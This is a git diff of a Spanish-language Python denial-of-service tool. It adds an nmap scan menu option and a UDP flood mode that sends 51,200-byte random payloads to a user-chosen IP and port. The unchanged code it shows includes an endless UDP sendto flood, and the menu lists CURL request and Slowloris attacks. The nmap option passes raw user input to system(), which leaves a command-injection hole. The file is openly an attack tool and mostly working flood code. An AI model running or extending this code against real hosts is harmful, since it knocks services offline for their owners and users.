@@ -5,6 +5,29 @@ import socket
 import random
 Creator=Fore.BLUE+"74lg0"
 Version=Fore.WHITE+"1.0"
+
+def Nmap_banner():
+    print(Fore.BLUE+"""
+    █████████████████████████████
+    █▄─▀█▄─▄█▄─▀█▀─▄██▀▄─██▄─▄▄─█
+    ██─█▄▀─███─█▄█─███─▀─███─▄▄▄█
+    ▀▄▄▄▀▀▄▄▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▄▀▀▀
+""")
+
+def banner_udp_flood():
+    print(Fore.RED+"██╗   ██╗██████╗ ██████╗"+Fore.WHITE+"     ██╗"+Fore.BLUE+" ████████╗ █████╗ ██████╗ ")
+    print(Fore.RED+"██║   ██║██╔══██╗██╔══██╗"+Fore.WHITE+"   ██╔╝"+Fore.BLUE+" ╚══██╔══╝██╔══██╗██╔══██╗")
+    print(Fore.RED+"██║   ██║██║  ██║██████╔╝"+Fore.WHITE+"  ██╔╝"+Fore.BLUE+"     ██║   ██║  ╚═╝██████╔╝")
+    print(Fore.RED+"██║   ██║██║  ██║██╔═══╝"+Fore.WHITE+"  ██╔╝"+Fore.BLUE+"      ██║   ██║  ██╗██╔═══╝ ")
+    print(Fore.RED+"╚██████╔╝██████╔╝██║"+Fore.WHITE+"     ██╔╝"+Fore.BLUE+"       ██║   ╚█████╔╝██║     ")
+    print(Fore.RED+" ╚═════╝ ╚═════╝ ╚═╝"+Fore.WHITE+"     ╚═╝"+Fore.BLUE+"        ╚═╝    ╚════╝ ╚═╝     ")
+   
+sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes=random._urandom(51200)
+sock_socket=socket.socket(socket.AF_INET)
+
+
+
 user_agents={
     
     "Opera/9.61.(X11; Linux x86_64; az-IN) Presto/2.9.190 Version/12.00"
@@ -29,7 +52,7 @@ print(Fore.BLUE+"██║░░██║██████╔╝░░░██
 print(Fore.BLUE+"╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝ "+Fore.RED+" ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░")
 print("~~~~~~~~~~~~~~~~~~~~~~~~~Created by:"+Creator+Fore.RED+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
 print("~~~~~~~~~~~~~~~~~~~~~~~~~ Version: "+Version+Fore.RED+" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
-method=input(Fore.GREEN+"\n[1]"+Fore.WHITE+"Peticiones CURL"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"Socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"Ver mi IP\n~~~~> ")
+method=input(Fore.GREEN+"\n[1]"+Fore.WHITE+"Peticiones CURL"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"Socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"Escaneo con Namp"+Fore.GREEN+"\n[5]"+Fore.WHITE+"Ver mi IP"+Fore.GREEN+"\n[6]"+Fore.WHITE+"UDP/TCP flood\n~~~~"+Fore.GREEN+"> "+Fore.WHITE+"")
 if method == "1":
     host=input("Ingresa el IP, Host\n~~~~> ")
     treads=input("Ingresa el numero de solicitudes, default("+Fore.BLUE+"500"+Fore.WHITE+")\n~~~~> ")
@@ -80,9 +103,6 @@ elif method == "2":
             
             
 elif method == "3":
-    sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes=random._urandom(51200)
-    sock_socket=socket.socket(socket.AF_INET)
     ip=input("Ingresa la IP\n~~~~> ")
     port=input("Ingresa el puerto, default("+Fore.BLUE+"80"+Fore.WHITE+")\n~~~~>")
     if port == "":
@@ -94,12 +114,43 @@ elif method == "3":
         while True:
             sock.sendto(bytes, (ip,int(port)))
             
-            
-            
 elif method == "4":
+    print("Escaneo con Nmap")
+    time.sleep(2)
+    system("clear")
+    Nmap_banner()
+    ip=input(Fore.WHITE+"Ingresa la direccion IPv4\n~~~~"+Fore.GREEN+"> ")
+    system("nmap -Pn "+ip)
+            
+            
+            
+elif method == "5":
     print("Tu direccion IP es:")
     time.sleep(1)
     system("curl ifconfig.me")
+    
+elif method == "6":
+    system("clear")
+    
+    banner_udp_flood()
+    
+    ip=input(Fore.WHITE+"Ingresa el IP, Host\n~~~~"+Fore.GREEN+"> "+Fore.WHITE+"")
+    port=int(input("Ingresa el puerto\n~~~~"+Fore.GREEN+"> "+Fore.WHITE+""))
+    time=int(input("Ingresa el numero de paquetes\n~~~~"+Fore.GREEN+"> "+Fore.WHITE+""))
+    if time == 1:
+        for x in range(1):
+            print(Fore.BLUE+"Enviando paquete #1"+" de "+str(time)+" paquetes"+Fore.YELLOW+" UDP "+Fore.WHITE+"a "+Fore.GREEN+ip+Fore.BLUE+" a treves del puerto "+Fore.YELLOW+str(port))
+            sock.connect((ip,int(port)))
+            sock.send(bytes)
+            
+            
+            
+            
+    for x in range(1, time):
+        print(Fore.BLUE+"Enviando paquete #"+str(x)+" de "+str(time)+" paquetes"+Fore.YELLOW+" UDP "+Fore.WHITE+"a "+Fore.GREEN+ip+Fore.BLUE+" a treves del puerto "+Fore.YELLOW+str(port))
+        sock.connect((ip,int(port)))
+        sock.send(bytes)
+    
     
 else:
     for i in range(100):
